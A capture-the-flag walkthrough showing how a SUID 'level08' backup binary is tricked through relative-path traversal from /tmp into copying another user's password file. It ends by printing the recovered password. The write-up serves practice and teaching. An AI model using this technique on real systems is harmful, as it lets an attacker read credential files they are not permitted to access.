# Walkthrough for Level 08

The `level08` binary takes a `path_to_a_file` as an argument and copies the contents of that file into a backup file
located at `./backups/$(path_to_a_file)`. Since `level08` is a SUID binary owned by `level09`, it has the permissions to
read `level09`'s password file located at `/home/users/level09/.pass` and therefore can create a backup of it. We try to
back up level09's password file by providing its path as an argument to the `level08` binary

```shell
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

An error message is shown indicating a failure while opening the backup file because `./backups//home/users/level09/.pass`
does not exist.

We change to a different directory where we have write permissions, in this case, `/tmp` .

```shell
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ 
```

We try to run the binary again from this new location using an absolute path to the binary and a relative path to 
level09's password file.

```shell
level08@OverRide:/tmp$ /home/users/level08/level08 ../home/users/level09/.pass
ERROR: Failed to open ./backups/.log
```

We get a different error message indicating that it failed to open `./backups/.log` so we create the `backups` directory
and an empty `.log` file inside.

```shell
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ cd backups/
level08@OverRide:/tmp/backups$ touch .log
```

We run the binary again.

```shell
level08@OverRide:/tmp$ cd /tmp
level08@OverRide:/tmp$ /home/users/level08/level08 ../home/users/level09/.pass
ERROR: Failed to open ./backups/../home/users/level09/.pass
```

We get another error message indicating that it failed to open `./backups/../home/users/level09/.pass`. Since our current
working directory is `/tmp`, the relative path `./backups/../home/users/level09/.pass` resolves to
`/tmp/home/users/level09/.pass`. This folder structure does not exist, so we create the necessary directories.


```shell
level08@OverRide:/tmp$ mkdir --parents /tmp/home/users/level09
```

We run the binary again and this time it works without any error messages. Meaning that it successfully copied the
contents of `/home/users/level09/.pass` to `/tmp/home/users/level09/.pass`.

```shell
level08@OverRide:/tmp$ /home/users/level08/level08 ../home/users/level09/.pass
```
We can verify this by checking the contents of the copied file.

```shell
level08@OverRide:/tmp$ cat /tmp/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
